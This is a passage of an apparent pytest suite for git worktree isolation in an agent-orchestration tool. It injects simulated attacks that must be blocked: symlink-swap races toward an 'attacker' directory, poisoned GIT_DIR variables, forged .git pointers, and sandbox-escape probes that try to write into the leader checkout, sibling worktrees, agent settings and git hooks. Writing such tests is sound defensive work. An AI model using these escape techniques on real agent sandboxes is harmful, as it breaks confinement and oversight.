"""Fail-closed worktree isolation tests.

Every guard has a falsification case: a deliberately injected violation that must
raise. Detection-only guards pair "does not raise" with a mutation case, so a
dead assertion cannot pass silently.
"""
from __future__ import annotations

import json
import os
import shutil
import subprocess
import tempfile
import sys
import time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from types import SimpleNamespace

import pytest

SRC = str(Path(__file__).resolve().parents[1] / "src")
if SRC not in sys.path:
    sys.path.insert(0, SRC)

from agent_flow.core.commands import SafeCommandResult
from tests.test_hook_integrity import _install as _install_managed_hooks
from agent_flow.core import worktrees as W
from agent_flow.core import worktree_isolation as W_ISO
from agent_flow.core.worktree_isolation import (
    WorkerScope,
    WorktreeIsolationError,
    assert_cwd_bound,
    assert_leader_unchanged,
    assert_scopes_isolated,
    assert_worktree_mergeable,
    capture_leader_snapshot,
    probe_provider_leases,
    real_path,
    sanitized_worker_env,
    verify_linked_worktree,
)
from agent_flow.providers.subprocess import ProviderCommand, run_provider
from agent_flow.providers import subprocess as PROVIDER_PROCESS


def _git(*args, cwd):
    return subprocess.run(("git", *args), cwd=str(cwd), capture_output=True, text=True)


def _init_repo(root: Path) -> None:
    _git("init", "-b", "main", cwd=root)
    _git("config", "user.email", "t@t", cwd=root)
    _git("config", "user.name", "t", cwd=root)
    (root / "f.txt").write_text("base\n", encoding="utf-8")
    _git("add", ".", cwd=root)
    _git("commit", "-m", "init", cwd=root)


def _init_repo_with_managed_hooks(root: Path) -> None:
    """run 시작 게이트가 요구하는 managed hook 등록까지 세운다.

    tripwire 테스트는 leader의 더러움·ignored 상태를 직접 구성하므로 hook 설치가
    관측을 바꾼다. 그래서 run을 실제로 시작하는 테스트만 이걸 쓴다.
    """
    _git("init", "-b", "main", cwd=root)
    _git("config", "user.email", "t@t", cwd=root)
    _git("config", "user.name", "t", cwd=root)
    _install_managed_hooks(root)
    (root / ".gitignore").write_text(
        "\n".join((".agent-flow/", ".claude/", ".Codex/", ".codex/", ".omp/")) + "\n",
        encoding="utf-8",
    )
    (root / "f.txt").write_text("base\n", encoding="utf-8")
    _git("add", ".gitignore", "f.txt", cwd=root)
    _git("commit", "-m", "init", cwd=root)


def _managed(root: Path) -> Path:
    """생성 규약이 정한 자리. 리터럴로 박으면 layout 변경을 테스트가 먼저 막는다."""
    return W.managed_worktrees_root(root)


def test_path_scoped_lookup_separates_query_failure_from_absence(tmp_path: Path):
    """반증: 조회 실패와 미등록이 같은 값이면 미등록 판정이 격리 우회가 된다.

    경로 스코프로 좁혀도 두 상태의 생성 계층은 갈라져 있어야 한다 —
    git이 실패하면 raise, 정상 출력에 대상 행이 없을 때만 None이다.
    """
    _init_repo(tmp_path)
    status = W.create_worktree(
        root=tmp_path, plan=W.plan_worktree(root=tmp_path, name="scoped")
    )

    found = W_ISO.registered_worktree_at(tmp_path, status.path)
    assert found is not None and found.registration_identity

    assert W_ISO.registered_worktree_at(tmp_path, tmp_path / "never-registered") is None

    broken = tmp_path.parent / f"{tmp_path.name}-broken"
    broken.mkdir()
    _init_repo(broken)
    (broken / ".git" / "config").write_text("[core\nnot valid ini\n", encoding="utf-8")
    with pytest.raises(W_ISO.WorktreeIsolationError):
        W_ISO.registered_worktree_at(broken, status.path)

def test_path_scoped_lookup_computes_only_the_target_fingerprint(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
):
    """불변: 등록 수만큼 지문을 계산하면 lifecycle 연산당 O(N²)로 증폭된다."""
    _init_repo(tmp_path)
    targets = [
        W.create_worktree(root=tmp_path, plan=W.plan_worktree(root=tmp_path, name=f"n{i}"))
        for i in range(4)
    ]
    real_identity = W_ISO._registered_worktree_identity
    calls: list = []

    def counting_identity(path, *, common_dir=None):
        calls.append(path)
        return real_identity(path, common_dir=common_dir)

    monkeypatch.setattr(W_ISO, "_registered_worktree_identity", counting_identity)
    assert W_ISO.registered_worktree_at(tmp_path, targets[-1].path) is not None

    assert len(calls) == 1


@pytest.mark.parametrize("raw", ("abc", "0", "-3"))
def test_declared_and_provider_capacity_reject_the_same_bad_env(
    raw: str,
    monkeypatch: pytest.MonkeyPatch,
):
    """반증: 잘못된 상한에서 provider slot은 거부하고 pool은 8로 계속 돌았다.

    같은 env를 두 파서가 다르게 읽으면 선언된 병렬도와 실제 병렬도가 갈린다.
    """
    monkeypatch.setenv("AGENT_FLOW_MAX_WORKERS", raw)

    with pytest.raises(W_ISO.WorktreeIsolationError):
        W_ISO._strict_provider_capacity(None)
    with pytest.raises(W_ISO.WorktreeIsolationError):
        W_ISO.max_worker_capacity()


def test_declared_capacity_matches_the_provider_slot_count(
    monkeypatch: pytest.MonkeyPatch,
):
    monkeypatch.setenv("AGENT_FLOW_MAX_WORKERS", "12")
    assert W_ISO.max_worker_capacity() == W_ISO._strict_provider_capacity(None) == 12


def test_file_lease_rejects_parent_swap_between_validation_and_open(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
):
    parent = tmp_path / "trusted"
    parent.mkdir()
    attacker = tmp_path / "attacker"
    attacker.mkdir()
    moved = tmp_path / "trusted-original"
    lock_path = parent / "lease.lock"
    real_open = W_ISO.os.open
    swapped = False

    def swapping_open(path, flags, mode=0o777, *, dir_fd=None):
        nonlocal swapped
        opens_lock = (
            dir_fd is None and Path(path) == lock_path
        ) or (
            dir_fd is not None and str(path) == lock_path.name
        )
        if opens_lock and not swapped:
            swapped = True
            parent.rename(moved)
            parent.symlink_to(attacker, target_is_directory=True)
        if dir_fd is None:
            return real_open(path, flags, mode)
        return real_open(path, flags, mode, dir_fd=dir_fd)

    monkeypatch.setattr(W_ISO.os, "open", swapping_open)

    with pytest.raises(W_ISO.FileLeaseUnavailable):
        with W_ISO.exclusive_file_lease(lock_path):
            pytest.fail("a lease on the replaced parent must not be yielded")

    assert swapped is True
    assert not (attacker / lock_path.name).exists()


def test_file_lease_rejects_path_inode_replacement_after_open(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
):
    parent = tmp_path / "state"
    parent.mkdir()
    lock_path = parent / "lease.lock"
    real_fstat = W_ISO.os.fstat
    replaced = False

    def replacing_fstat(fd):
        nonlocal replaced
        identity = real_fstat(fd)
        if W_ISO.stat.S_ISREG(identity.st_mode) and not replaced:
            replaced = True
            lock_path.unlink()
            lock_path.write_text("replacement", encoding="utf-8")
        return identity

    monkeypatch.setattr(W_ISO.os, "fstat", replacing_fstat)

    with pytest.raises(W_ISO.FileLeaseUnavailable):
        with W_ISO.exclusive_file_lease(lock_path):
            pytest.fail("a lease on an unlinked inode must not be yielded")

    assert replaced is True



def test_file_lease_rejects_path_replacement_while_locking(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
):
    parent = tmp_path / "state"
    parent.mkdir()
    lock_path = parent / "lease.lock"
    real_flock = W_ISO.fcntl.flock
    replaced = False

    def replacing_flock(fd, operation):
        nonlocal replaced
        if operation & W_ISO.fcntl.LOCK_EX and not replaced:
            replaced = True
            lock_path.unlink()
            lock_path.write_text("replacement", encoding="utf-8")
        return real_flock(fd, operation)

    monkeypatch.setattr(W_ISO.fcntl, "flock", replacing_flock)

    with pytest.raises(W_ISO.FileLeaseUnavailable):
        with W_ISO.exclusive_file_lease(lock_path):
            pytest.fail("a lease whose path changed while locking must not be yielded")

    assert replaced is True


def test_sanitized_env_strips_leaky_git_vars():
    base = {"GIT_DIR": "/x/.git", "GIT_WORK_TREE": "/x", "GIT_COMMON_DIR": "/x/.git",
            "GIT_INDEX_FILE": "/x/index", "PATH": "/usr/bin", "HOME": "/home/u"}
    env = sanitized_worker_env(base_env=base)
    for leaked in ("GIT_DIR", "GIT_WORK_TREE", "GIT_COMMON_DIR", "GIT_INDEX_FILE"):
        assert leaked not in env
    # non-git vars survive
    assert env["PATH"] == "/usr/bin" and env["HOME"] == "/home/u"



def test_verify_accepts_valid_worktree(tmp_path):
    _init_repo(tmp_path)
    plan = W.plan_worktree(root=tmp_path, name="alpha")
    status = W.create_worktree(root=tmp_path, plan=plan)
    verified = verify_linked_worktree(
        root=tmp_path, path=status.path, expected_branch=plan.branch
    )
    assert verified == real_path(status.path)


def test_create_can_atomically_refuse_an_existing_worktree(tmp_path: Path):
    _init_repo(tmp_path)
    plan = W.plan_worktree(root=tmp_path, name="same-task")
    created = W.create_worktree(root=tmp_path, plan=plan)

    with pytest.raises(ValueError, match="already exists"):
        W.create_worktree(
            root=tmp_path,
            plan=plan,
            reuse_existing=False,
        )

    assert created.path.exists()


def test_verify_rejects_leader(tmp_path):
    _init_repo(tmp_path)
    with pytest.raises(WorktreeIsolationError):
        verify_linked_worktree(root=tmp_path, path=tmp_path, managed_root=_managed(tmp_path))


def test_verify_rejects_unregistered_dir(tmp_path):
    _init_repo(tmp_path)
    fake = _managed(tmp_path) / "feat-fake"
    fake.mkdir(parents=True)
    (fake / ".git").write_text("gitdir: /nowhere\n", encoding="utf-8")
    with pytest.raises(WorktreeIsolationError):
        verify_linked_worktree(root=tmp_path, path=fake)


def test_verify_rejects_symlink_escape(tmp_path):
    _init_repo(tmp_path)
    outside = tmp_path / "outside"
    outside.mkdir()
    _managed(tmp_path).mkdir(parents=True)
    link = _managed(tmp_path) / "feat-evil"
    os.symlink(str(outside), str(link))
    # realpath resolves the symlink out of the managed root -> reject.
    with pytest.raises(WorktreeIsolationError):
        verify_linked_worktree(root=tmp_path, path=link)


def test_verify_rejects_a_symlinked_git_pointer(tmp_path: Path):
    _init_repo(tmp_path)
    status = W.create_worktree(
        root=tmp_path,
        plan=W.plan_worktree(root=tmp_path, name="pointer"),
    )
    pointer = status.path / ".git"
    copied = status.path / ".git-copy"
    copied.write_bytes(pointer.read_bytes())
    pointer.unlink()
    pointer.symlink_to(copied)

    with pytest.raises(WorktreeIsolationError, match="pointer file"):
        verify_linked_worktree(root=tmp_path, path=status.path)


def test_verify_rejects_a_git_pointer_to_a_sibling_worktree(tmp_path: Path):
    _init_repo(tmp_path)
    first = W.create_worktree(
        root=tmp_path,
        plan=W.plan_worktree(root=tmp_path, name="first-pointer"),
    )
    second = W.create_worktree(
        root=tmp_path,
        plan=W.plan_worktree(root=tmp_path, name="second-pointer"),
    )
    (first.path / ".git").write_bytes((second.path / ".git").read_bytes())

    # 훔친 gitdir 포인터는 채택 지문을 먼저 깬다 — 관리 루트 판정에서 걸린다.
    with pytest.raises(WorktreeIsolationError, match="not a direct child of a managed root"):
        verify_linked_worktree(root=tmp_path, path=first.path)

    # 그릇을 호출자가 지정해 그 판정을 건너뛰어도 gitdir 왕복 검증이 잡는다.
    with pytest.raises(WorktreeIsolationError, match="does not point back"):
        verify_linked_worktree(
            root=tmp_path, path=first.path, managed_root=first.path.parent
        )


def test_verify_rejects_wrong_branch(tmp_path):
    _init_repo(tmp_path)
    plan = W.plan_worktree(root=tmp_path, name="beta")
    status = W.create_worktree(root=tmp_path, plan=plan)
    with pytest.raises(WorktreeIsolationError):
        verify_linked_worktree(root=tmp_path, path=status.path, expected_branch="feat/not-this")



def test_assert_cwd_bound_rejects_mismatch(tmp_path):
    a = tmp_path / "a"
    b = tmp_path / "b"
    a.mkdir()
    b.mkdir()
    assert_cwd_bound(worktree_path=a, cwd=a)
    with pytest.raises(WorktreeIsolationError):
        assert_cwd_bound(worktree_path=a, cwd=b)



def test_scope_gate_rejects_overlap_without_isolation():
    with pytest.raises(WorktreeIsolationError):
        assert_scopes_isolated([
            WorkerScope("a", ("src/x.py",), False),
            WorkerScope("b", ("src/x.py",), False),
        ])


def test_scope_gate_rejects_prefix_overlap_without_isolation():
    with pytest.raises(WorktreeIsolationError):
        assert_scopes_isolated([
            WorkerScope("a", ("src",), False),
            WorkerScope("b", ("src/deep/y.py",), True),
        ])


def test_scope_gate_rejects_glob_without_both_isolated():
    with pytest.raises(WorktreeIsolationError):
        assert_scopes_isolated([
            WorkerScope("a", ("src/*",), True),
            WorkerScope("b", ("docs/y",), False),
        ])


def test_scope_gate_allows_overlap_when_both_isolated():
    """불변: 겹치는 write scope는 양쪽 모두 worktree 격리를 선언했을 때만 통과한다."""
    overlapping = ("src/x.py",)
    # 통과해야 하는 쪽: 둘 다 격리 선언.
    assert_scopes_isolated([
        WorkerScope("a", overlapping, True),
        WorkerScope("b", overlapping, True),
    ])
    # 게이트가 실제로 판단하고 있다는 증거: 플래그 하나만 뒤집으면 거부된다.
    # 가드를 `return` 한 줄로 비우면 이 절이 실패한다.
    with pytest.raises(WorktreeIsolationError) as rejected:
        assert_scopes_isolated([
            WorkerScope("a", overlapping, True),
            WorkerScope("b", overlapping, False),
        ])
    message = str(rejected.value)
    assert "'a'" in message and "'b'" in message


def test_scope_gate_allows_disjoint():
    """불변: 서로 겹치지 않는 scope는 격리 선언이 없어도 통과한다."""
    # 통과해야 하는 쪽: 경로가 겹치지 않음.
    assert_scopes_isolated([
        WorkerScope("a", ("src/a.py",), False),
        WorkerScope("b", ("src/b.py",), False),
    ])
    # 경로 하나만 겹치게 바꾸면 같은 입력이 거부된다 — disjoint 판정이 실재한다.
    with pytest.raises(WorktreeIsolationError):
        assert_scopes_isolated([
            WorkerScope("a", ("src/a.py",), False),
            WorkerScope("b", ("src/a.py",), False),
        ])



def test_mergeable_rejects_dirty(tmp_path):
    _init_repo(tmp_path)
    plan = W.plan_worktree(root=tmp_path, name="gamma")
    status = W.create_worktree(root=tmp_path, plan=plan)
    (status.path / "scratch.txt").write_text("wip\n", encoding="utf-8")
    with pytest.raises(WorktreeIsolationError):
        assert_worktree_mergeable(root=tmp_path, path=status.path)


def test_mergeable_rejects_unmerged(tmp_path):
    _init_repo(tmp_path)
    plan = W.plan_worktree(root=tmp_path, name="delta")
    status = W.create_worktree(root=tmp_path, plan=plan)
    (status.path / "new.txt").write_text("work\n", encoding="utf-8")
    _git("add", ".", cwd=status.path)
    _git("commit", "-m", "worker work", cwd=status.path)
    with pytest.raises(WorktreeIsolationError):
        assert_worktree_mergeable(root=tmp_path, path=status.path)


def test_mergeable_allows_clean_merged(tmp_path):
    """불변: merge 증명이 통과한 worktree는 require_merged 삭제가 실제로 성공한다."""
    _init_repo(tmp_path)
    plan = W.plan_worktree(root=tmp_path, name="epsilon")
    status = W.create_worktree(root=tmp_path, plan=plan)
    # fresh worktree tip == base == leader HEAD -> ancestor, clean -> mergeable
    assert_worktree_mergeable(root=tmp_path, path=status.path)
    # 관찰 가능한 결과: 증명이 통과했으므로 기본(require_merged) 삭제가 끝까지
    # 진행되어 체크아웃과 git 등록이 함께 사라진다.
    W.remove_worktree(root=tmp_path, status=status)
    assert not status.path.exists()
    assert real_path(plan.path) not in _registered(tmp_path)
    assert not W.worktree_branch_exists(root=tmp_path, branch=plan.branch)


def test_remove_refuses_unmerged_and_preserves(tmp_path):
    _init_repo(tmp_path)
    plan = W.plan_worktree(root=tmp_path, name="zeta")
    status = W.create_worktree(root=tmp_path, plan=plan)
    (status.path / "new.txt").write_text("work\n", encoding="utf-8")
    _git("add", ".", cwd=status.path)
    _git("commit", "-m", "worker work", cwd=status.path)
    with pytest.raises(WorktreeIsolationError):
        W.remove_worktree(root=tmp_path, status=status)
    # falsification: the worktree survived the refused removal.
    assert status.path.exists()
    # explicit override removes it.
    W.remove_worktree(root=tmp_path, status=status, allow_unmerged=True)
    assert not status.path.exists()


def test_remove_rejects_recreated_checkout_with_same_path_branch_and_head(
    tmp_path: Path,
    monkeypatch,
):
    _init_repo(tmp_path)
    status = W.create_worktree(
        root=tmp_path,
        plan=W.plan_worktree(root=tmp_path, name="remove-recreated"),
    )
    real_registered_at_path = W._registered_at_path
    probes = 0

    def recreate_before_final_identity_check(*, root: Path, path: Path):
        nonlocal probes
        probes += 1
        if probes == 2:
            _git("worktree", "remove", "--force", str(path), cwd=root)
            _git("worktree", "add", str(path), status.branch, cwd=root)
        return real_registered_at_path(root=root, path=path)

    monkeypatch.setattr(W, "_registered_at_path", recreate_before_final_identity_check)
    with pytest.raises(WorktreeIsolationError, match="registration changed"):
        W.remove_worktree(
            root=tmp_path,
            status=status,
            delete_branch=False,
            require_merged=False,
            allow_unmerged=True,
        )

    assert probes >= 2
    assert status.path.exists()
    assert real_path(status.path) in _registered(tmp_path)



def test_registration_identity_survives_git_lock_and_unlock(tmp_path: Path):
    _init_repo(tmp_path)
    status = W.create_worktree(
        root=tmp_path,
        plan=W.plan_worktree(root=tmp_path, name="identity-lock"),
    )
    before = W._registered_at_path(root=tmp_path, path=status.path)
    _git("worktree", "lock", str(status.path), cwd=tmp_path)
    locked = W._registered_at_path(root=tmp_path, path=status.path)
    _git("worktree", "unlock", str(status.path), cwd=tmp_path)
    after = W._registered_at_path(root=tmp_path, path=status.path)

    assert before is not None and before.registration_identity is not None
    assert locked is not None and locked.registration_identity == before.registration_identity
    assert after is not None and after.registration_identity == before.registration_identity


def test_attach_rejects_recreated_checkout_after_reuse_consent(tmp_path: Path):
    _init_repo(tmp_path)
    status = W.create_worktree(
        root=tmp_path,
        plan=W.plan_worktree(root=tmp_path, name="attach-recreated"),
    )
    original_identity = status.registration_identity
    assert original_identity is not None
    _git("worktree", "remove", "--force", str(status.path), cwd=tmp_path)
    _git("worktree", "add", str(status.path), status.branch, cwd=tmp_path)

    recreated = W.get_worktree_status(root=tmp_path, name=status.name)
    assert recreated.registration_identity != original_identity
    with pytest.raises(WorktreeIsolationError, match="registration changed"):
        W.attach_worktree(
            root=tmp_path,
            selector=status.name,
            expected_registration_identity=original_identity,
        )


def test_unique_naming_produces_distinct_trees(tmp_path):
    _init_repo(tmp_path)
    p1 = W.plan_worktree(root=tmp_path, name="shared-task", unique="w1")
    p2 = W.plan_worktree(root=tmp_path, name="shared-task", unique="w2")
    assert p1.path != p2.path and p1.branch != p2.branch
    s1 = W.create_worktree(root=tmp_path, plan=p1)
    s2 = W.create_worktree(root=tmp_path, plan=p2)
    assert s1.path.exists() and s2.path.exists() and s1.path != s2.path


def test_orphan_registration_is_pruned(tmp_path):
    _init_repo(tmp_path)
    plan = W.plan_worktree(root=tmp_path, name="eta")
    status = W.create_worktree(root=tmp_path, plan=plan)
    # simulate a crash: remove the checkout dir but leave git's registration.
    import shutil
    shutil.rmtree(status.path)
    assert plan.path in {p for p in _registered(tmp_path)}
    # re-create must recover deterministically (prune under the creation lock).
    status2 = W.create_worktree(root=tmp_path, plan=plan)
    assert status2.path.exists()
    verify_linked_worktree(root=tmp_path, path=status2.path, expected_branch=plan.branch)


def _registered(root: Path):
    out = _git("worktree", "list", "--porcelain", cwd=root).stdout
    return {real_path(line[len("worktree "):].strip())
            for line in out.splitlines() if line.startswith("worktree ")}



def test_create_is_fail_closed_on_persistent_git_failure(tmp_path, monkeypatch):
    """불변: 생성이 실패하면 절반만 만들어진 worktree/브랜치/등록이 남지 않는다."""
    _init_repo(tmp_path)
    baseline = _git("status", "--porcelain", cwd=tmp_path).stdout
    attempts = []
    _orig = W._run_git

    def _boom(root, *args):
        if args[:2] == ("worktree", "add"):
            attempts.append(args)
            raise subprocess.CalledProcessError(1, ("git",) + args, stderr="fatal: index.lock exists")
        return _orig(root, *args)

    monkeypatch.setattr(W, "_run_git", _boom)
    plan = W.plan_worktree(root=tmp_path, name="theta")
    with pytest.raises((WorktreeIsolationError, subprocess.CalledProcessError)):
        W.create_worktree(root=tmp_path, plan=plan)
    monkeypatch.undo()
    # lock 경합은 재시도하되 무한히 돌지 않고 포기했다는 증거.
    assert 1 < len(attempts) <= 8
    # 남은 것이 없다는 증명은 논리곱이어야 한다. 예전 논리합은 add가 아예 막혀
    # 있어서 어떤 구현에서도 참이었다.
    assert not plan.path.exists()
    assert real_path(plan.path) not in _registered(tmp_path)
    assert not W.worktree_branch_exists(root=tmp_path, branch=plan.branch)
    assert _git("status", "--porcelain", cwd=tmp_path).stdout == baseline

    # 두 번째 국면: 생성은 성공하고 그 뒤 manifest 쓰기가 실패하면, 이미 만들어진
    # worktree를 실제로 되돌려야 한다. 여기서만 "cleanup"을 증명할 수 있다.
    def _manifest_boom(*, root, status):
        raise OSError("disk full")

    monkeypatch.setattr(W, "write_worktree_manifest", _manifest_boom)
    rollback_plan = W.plan_worktree(root=tmp_path, name="theta-rollback")
    with pytest.raises(OSError):
        W.create_worktree(root=tmp_path, plan=rollback_plan)
    monkeypatch.undo()
    assert not rollback_plan.path.exists()
    assert real_path(rollback_plan.path) not in _registered(tmp_path)
    assert not W.worktree_branch_exists(root=tmp_path, branch=rollback_plan.branch)
    assert _git("status", "--porcelain", cwd=tmp_path).stdout == baseline



def _create_one(root: Path, name: str) -> subprocess.CompletedProcess:
    code = (
        "import sys; sys.path.insert(0, %r)\n"
        "from pathlib import Path\n"
        "from agent_flow.core.worktrees import plan_worktree, create_worktree\n"
        "from agent_flow.core.worktree_isolation import verify_linked_worktree\n"
        "root = Path(%r)\n"
        "plan = plan_worktree(root=root, name=%r)\n"
        "st = create_worktree(root=root, plan=plan, allow_dirty=True)\n"
        "verify_linked_worktree(root=root, path=st.path, expected_branch=plan.branch)\n"
        "print(st.path)\n"
    ) % (SRC, str(root), name)
    env = dict(os.environ)
    env["PYTHONPATH"] = SRC
    return subprocess.run([sys.executable, "-c", code], capture_output=True, text=True, env=env)


def test_parallel_creation_is_isolated_and_leaves_main_clean(tmp_path):
    _init_repo(tmp_path)
    leader_f = (tmp_path / "f.txt").read_text(encoding="utf-8")
    leader_head = _git("rev-parse", "HEAD", cwd=tmp_path).stdout.strip()

    n = 16
    names = [f"task-{i}" for i in range(n)]
    created = []
    # two bursts to stress the cross-process creation lock.
    for _ in range(2):
        with ThreadPoolExecutor(max_workers=n) as pool:
            results = list(pool.map(lambda nm: _create_one(tmp_path, nm), names))
        for r in results:
            assert r.returncode == 0, r.stderr
            created.append(r.stdout.strip())

    paths = [real_path(p) for p in created if p]
    unique = set(paths)
    assert len(unique) == n, f"expected {n} unique worktrees, got {len(unique)}"
    for p in unique:
        assert (Path(p) / ".git").is_file()

    # zero main contamination: leader source, HEAD, and tracked tree unchanged.
    assert (tmp_path / "f.txt").read_text(encoding="utf-8") == leader_f
    assert _git("rev-parse", "HEAD", cwd=tmp_path).stdout.strip() == leader_head
    dirty = [
        line for line in _git("status", "--porcelain", cwd=tmp_path).stdout.splitlines()
        if line and not line[3:].startswith(".agent-flow")
    ]
    assert dirty == [], f"leader checkout was contaminated: {dirty}"



def _cli(argv, cwd, env=None):
    full = dict(os.environ)
    full["PYTHONPATH"] = SRC
    if env:
        full.update(env)
    return subprocess.run(
        [sys.executable, "-c",
         "import sys; from agent_flow.cli import main; sys.exit(main(sys.argv[1:]))", *argv],
        cwd=str(cwd), capture_output=True, text=True, env=full,
    )


@pytest.mark.skipif(
    sys.platform != "darwin" or not Path("/usr/bin/sandbox-exec").is_file(),
    reason="macOS sandbox-exec confinement is required",
)
def test_e2e_team_run_next_confines_worker_writes_and_git(tmp_path):
    _init_repo_with_managed_hooks(tmp_path)
    assert _cli(["team", "init", "--root", ".", "--name", "ft"], cwd=tmp_path).returncode == 0
    assert _cli(["team", "task", "--root", ".", "--team", "ft", "--id", "t1",
                 "--subject", "s", "--description", "d"], cwd=tmp_path).returncode == 0
    assert _cli(["team", "worker", "--root", ".", "--team", "ft", "--name", "w1",
                 "--role", "impl"], cwd=tmp_path).returncode == 0
    assert _cli(["team", "brief", "--root", ".", "--team", "ft", "--task", "t1",
                 "--worker", "w1", "--brief", "Use the worker-brief contract.",
                 "--write-scope", "src/feature"], cwd=tmp_path).returncode == 0
    assert _cli(["team", "approve-worker", "--root", ".", "--team", "ft", "--task", "t1",
                 "--worker", "w1", "--write-scope", "src/feature"], cwd=tmp_path).returncode == 0

    # Worker writes its report into a worktree file. A poisoned GIT_DIR in the
    # parent env must not redirect the worker's writes or git discovery to main.
    worker = (
        "import os, subprocess\n"
        "top = subprocess.run(['git','rev-parse','--show-toplevel'],capture_output=True,text=True).stdout.strip()\n"
        "report = 'CWD=%s\\nTOP=%s\\nGITDIR=%s\\n' % (os.path.realpath(os.getcwd()), os.path.realpath(top) if top else '', os.environ.get('GIT_DIR','<unset>'))\n"
        "open('worker-out.txt','w').write(report)\n"
    )
    poisoned = {"GIT_DIR": str(tmp_path / ".git"), "GIT_WORK_TREE": str(tmp_path)}
    res = _cli(["team", "run-next", "--root", ".", "--team", "ft", "--worker", "w1",
                "--command", sys.executable, "-c", worker], cwd=tmp_path, env=poisoned)
    assert res.returncode == 0, res.stderr
    assert "t1 completed" in res.stdout

    wt = _managed(tmp_path) / "feat-t1-w1"
    assert (wt / "worker-out.txt").exists(), "worker output missing from its worktree"
    assert not (tmp_path / "worker-out.txt").exists(), "worker leaked a write into the leader"

    report = (wt / "worker-out.txt").read_text(encoding="utf-8")
    assert f"CWD={real_path(wt)}" in report
    # git env was sanitized: the worker's git top-level is the worktree, not main.
    assert f"TOP={real_path(wt)}" in report
    assert "GITDIR=<unset>" in report

    # leader tracked tree stayed clean.
    dirty = [
        line for line in _git("status", "--porcelain", cwd=tmp_path).stdout.splitlines()
        if line and not line[3:].startswith(".agent-flow")
    ]
    assert dirty == []


@pytest.mark.skipif(
    sys.platform != "darwin" or not Path("/usr/bin/sandbox-exec").is_file(),
    reason="macOS sandbox-exec confinement is required",
)
def test_real_provider_process_is_confined_to_attested_checkout(tmp_path):
    _init_repo(tmp_path)
    (tmp_path / ".gitignore").write_text(".agent-flow/\n", encoding="utf-8")
    _git("add", ".gitignore", cwd=tmp_path)
    _git("commit", "-m", "ignore runtime", cwd=tmp_path)
    worker = W.create_worktree(
        root=tmp_path,
        plan=W.plan_worktree(root=tmp_path, name="worker"),
    )
    sibling = W.create_worktree(
        root=tmp_path,
        plan=W.plan_worktree(root=tmp_path, name="sibling"),
    )
    leader_target = tmp_path / "leader-target.txt"
    leader_target.write_text("leader\n", encoding="utf-8")
    escape_link = worker.path / "leader-link"
    escape_link.symlink_to(leader_target)
    absolute_target = tmp_path.parent / f"{tmp_path.name}-absolute-leak.txt"
    child_target = tmp_path / "child-leak.txt"
    worker_state_target = worker.path / ".claude" / "settings.json"
    worker_state_target.parent.mkdir()
    git_pointer_before = (worker.path / ".git").read_bytes()
    program = (
        "import json, subprocess, sys\n"
        "from pathlib import Path\n"
        "leader, sibling, absolute, child, worker_state = map(Path, sys.argv[1:6])\n"
        "def denied(path):\n"
        "    try:\n"
        "        path.write_text('leak', encoding='utf-8')\n"
        "        return False\n"
        "    except OSError:\n"
        "        return True\n"
        "Path('inside.txt').write_text('inside\\n', encoding='utf-8')\n"
        "child_run = subprocess.run([sys.executable, '-c', "
        "\"from pathlib import Path; import sys; Path(sys.argv[1]).write_text('child')\", "
        "str(child)], capture_output=True, text=True)\n"
        "result = {'leader': denied(leader), 'sibling': denied(sibling), "
        "'absolute': denied(absolute), 'symlink': denied(Path('leader-link')), "
        "'child': child_run.returncode != 0, 'worker-state': denied(worker_state), "
        "'git-pointer': denied(Path('.git'))}\n"
        "Path('confinement.json').write_text(json.dumps(result), encoding='utf-8')\n"
    )
    result = run_provider(
        ProviderCommand(
            name="confinement-probe",
            argv=(
                sys.executable,
                "-c",
                program,
                str(leader_target),
                str(sibling.path / "sibling-leak.txt"),
                str(absolute_target),
                str(child_target),
                str(worker_state_target),
            ),
        ),
        prompt="",
        cwd=worker.path,
    )

    assert result.failed is False, result.stderr
    assert (worker.path / "inside.txt").read_text(encoding="utf-8") == "inside\n"
    denied = json.loads(
        (worker.path / "confinement.json").read_text(encoding="utf-8")
    )
    assert denied == {
        "leader": True,
        "sibling": True,
        "absolute": True,
        "symlink": True,
        "child": True,
        "worker-state": True,
        "git-pointer": True,
    }
    assert leader_target.read_text(encoding="utf-8") == "leader\n"
    assert not (sibling.path / "sibling-leak.txt").exists()
    assert not absolute_target.exists()
    assert not child_target.exists()
    assert not worker_state_target.exists()
    assert (worker.path / ".git").read_bytes() == git_pointer_before


@pytest.mark.skipif(
    sys.platform != "darwin" or not Path("/usr/bin/sandbox-exec").is_file(),
    reason="macOS sandbox-exec confinement is required",
)
def test_provider_commits_from_its_worktree_without_reaching_git_control_files(tmp_path):
    """반증: 공유 gitdir를 통째로 막으면 worker는 자기 작업을 커밋조차 못 한다.

    linked worktree의 index·objects·refs는 checkout이 아니라 leader의 git common
    dir 아래 있다. 그 자리를 열지 않으면 `git add` 한 줄이
    `Unable to create '<leader>/.git/worktrees/<name>/index.lock'`로 죽고,
    사용자에게는 leader가 있는 폴더가 통째로 잠긴 것처럼 보인다. 반대로 통째로
    열면 다음 git 실행 때 코드를 실행시킬 자리(hooks·config)가 열린다. 그래서
    커밋은 되고 그 자리는 계속 막혀 있다는 것을 함께 고정한다.
    """
    _init_repo(tmp_path)
    (tmp_path / ".gitignore").write_text(".agent-flow/\n", encoding="utf-8")
    _git("add", ".gitignore", cwd=tmp_path)
    _git("commit", "-m", "ignore runtime", cwd=tmp_path)
    worker = W.create_worktree(
        root=tmp_path,
        plan=W.plan_worktree(root=tmp_path, name="worker"),
    )
    common = real_path(tmp_path / ".git")
    gitdir = common / "worktrees" / worker.path.name
    program = (
        "import json, subprocess, sys\n"
        "from pathlib import Path\n"
        "common, gitdir = map(Path, sys.argv[1:3])\n"
        "def denied(path):\n"
        "    try:\n"
        "        path.write_text('leak', encoding='utf-8')\n"
        "        return False\n"
        "    except OSError:\n"
        "        return True\n"
        "Path('committed.txt').write_text('work\\n', encoding='utf-8')\n"
        "add = subprocess.run(['git', 'add', 'committed.txt'], capture_output=True, text=True)\n"
        "commit = subprocess.run(['git', 'commit', '-m', 'worker commit'], "
        "capture_output=True, text=True)\n"
        "result = {'add': add.returncode, 'commit': commit.returncode,\n"
        "          'stderr': (add.stderr + commit.stderr).strip(),\n"
        "          'hooks': denied(common / 'hooks' / 'pre-commit'),\n"
        "          'config': denied(common / 'config'),\n"
        "          'config-worktree': denied(gitdir / 'config.worktree'),\n"
